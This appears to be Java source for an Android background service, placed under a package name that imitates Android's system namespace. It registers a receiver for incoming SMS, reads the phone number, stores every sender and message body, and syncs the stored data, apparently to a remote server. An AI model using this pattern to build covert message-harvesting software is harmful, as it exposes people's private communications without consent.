package android.service.app;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Handler;
import android.os.IBinder;
import android.os.RemoteException;
import android.service.app.db.Database;
import android.service.app.db.data.Message;
import android.service.app.db.inventory.Device;
import android.service.app.db.sync.Sync;
import android.service.app.db.user.Account;
import android.service.app.rest.ImportDataTask;
import android.service.app.rest.SyncOutput;
import android.service.app.rest.ExportDataTask;
import android.service.app.utils.AndroidUtils;
import android.service.app.utils.Log;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;

public class Service extends android.app.Service
{
    public static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

    protected Handler handler = new Handler();
    public AndroidApplication app;
    private RemoteService.Stub remoteServiceStub;
    private boolean serviceStatus;
    private Device device = null;

    @Override
    public void onCreate()
    {
        app = (AndroidApplication) getApplication();
        app.service = this;
        app.serviceOnCreate = true;
        serviceStatus = true;

        SmsObserver smsObserver = new SmsObserver(this, handler);
        IntentFilter smsFilter = new IntentFilter(SMS_RECEIVED);

        ReceiverManager receiverManager = ReceiverManager.init(getApplicationContext());
        if (!receiverManager.isReceiverRegistered(smsObserver.inSms))
        {
            receiverManager.registerReceiver(smsObserver.inSms, smsFilter, getApplicationContext());
            initDatabase(getApplicationContext());
        }

        fillDeviceIfNeeeded();
    }

    private void fillDeviceIfNeeeded()
    {
        if (device == null)
        {
            Database.DatabaseWork databaseWork = new Database.DatabaseWork(getApplicationContext())
            {
                @Override
                public Object execute()
                {
                    return device();
                }
            };

            this.device = (Device) databaseWork.run();
            if (Log.isInfoEnabled()) Log.info("device=" + device);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
        if (Log.isDebugEnabled()) Log.debug("call onStartCommand");

        remoteServiceStub = new RemoteService.Stub()
        {
            public void sendString(String string) throws RemoteException
            {

            }
        };

        app.service = this;
        app.serviceOnCreate = false;

        runSync(getApplicationContext());

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy()
    {
        super.onDestroy();

        ReceiverManager receiverManager = ReceiverManager.init(getApplicationContext());
        SmsObserver smsObserver = new SmsObserver(this, handler);
        if (receiverManager.isReceiverRegistered(smsObserver.inSms))
        {
            receiverManager.unregisterReceiver(smsObserver.inSms, getApplicationContext());
        }

        serviceStatus = false;
    }

    public static void initDatabase(final Context context)
    {
        if (Log.isInfoEnabled()) Log.info("initDatabase");
        //Database.clear(context);

        TelephonyManager tm = (TelephonyManager) context.getSystemService(TELEPHONY_SERVICE);
        final String phoneNumber = tm.getLine1Number();

        Database.DatabaseWork databaseWork = new Database.DatabaseWork(context){
            @Override
            public Object execute()
            {
                if (device().isEmpty())
                {

                    //todo: need to parse this parameters from settings
                    int accountId = addData(new Account(phoneNumber + "_xmail@mail.server"));

                    Device device = new Device(AndroidUtils.getDeviceName(), accountId);
                    int deviceId = addData(device);

                    Sync sync = new Sync(accountId, deviceId, device.getTableName());
                    updateOrInsertSyncIfNeeded(sync);
                    //todo: need to parse this parameters from settings
                }

                if (Log.isInfoEnabled()) Log.info("actualMessages=" + messages().getActualBySync());
                return null;
            }
        };

        databaseWork.runInTransaction();
    }

    private static void runSync(final Context context)
    {
        Database.DatabaseWork databaseWork = new Database.DatabaseWork(context){
            @Override
            public Object execute()
            {
                // sync for object functionality
                new ExportDataTask<>(this, context, SyncOutput.getStringCallbackHandler()).execute();

                // sync for subobject functionality
                new ImportDataTask<>(this, context, SyncOutput.getStringCallbackHandler()).execute();

                return null;
            }
        };

        databaseWork.run();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent)
    {
        return remoteServiceStub;
    }

    public void runSmsEvent(final String address, final String body, final boolean incoming, ContentResolver contentResolver)
    {
        new Thread(new Runnable()
        {
            public void run()
            {
                AndroidUtils.printDataOnScreen(address + ": " + body, app.service);
                saveMessageInDatabase(address, incoming, body);
            }
        }).start();
    }

    private void saveMessageInDatabase(final String address, final boolean incoming, final String body)
    {
        Database.DatabaseWork databaseWork = new Database.DatabaseWork(getApplicationContext()){
            @Override
            public Object execute()
            {
                return addData(new Message(address, incoming, body, device.getId()));
            }
        };

        databaseWork.runInTransaction();
    }
}
